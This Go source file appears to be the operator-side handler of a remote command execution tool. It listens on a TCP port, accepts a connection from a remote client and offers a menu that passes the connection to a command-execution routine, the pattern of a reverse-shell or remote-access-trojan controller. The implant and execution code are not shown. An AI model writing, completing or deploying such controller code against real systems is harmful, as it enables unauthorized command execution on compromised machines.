package core

import (
	"bufio"
	"fmt"
	"log"
	"net"
	"os"
	"strings"

	"github.com/brandon-a-pinto/sozoku/internal/server/execution"
)

func ConnectWithClient(IP, Port string) (conn net.Conn, err error) {
	address := IP + ":" + Port

	listener, err := net.Listen("tcp", address)
	if err != nil {
		return nil, err
	}

	fmt.Printf("[+] Server running: %s:%s\n", IP, Port)

	connection, err := listener.Accept()
	if err != nil {
		fmt.Printf("[-] Connection refused\n")
	} else {
		fmt.Printf("[+] Connection established: %s\n", connection.RemoteAddr().String())
	}

	return connection, nil
}

func Options(connection net.Conn) {
	reader := bufio.NewReader(os.Stdin)
	loop := true

	for loop {
		fmt.Println("\n0) Exit")
		fmt.Println("1) Command Execution")

		fmt.Printf("\n-> ")
		rawInput, err := reader.ReadString('\n')
		if err != nil {
			log.Fatal(err)
			continue
		}

		connection.Write([]byte(rawInput))
		input := strings.TrimSuffix(rawInput, "\n")

		switch {
		case input == "exit":
			fmt.Println("\nExiting...")
			loop = false
		case input == "0":
			fmt.Println("\nExiting...")
			loop = false
		case input == "1":
			execution.ExecuteCommand(connection)
		default:
			fmt.Println("\nInvalid option!")
		}
	}
}
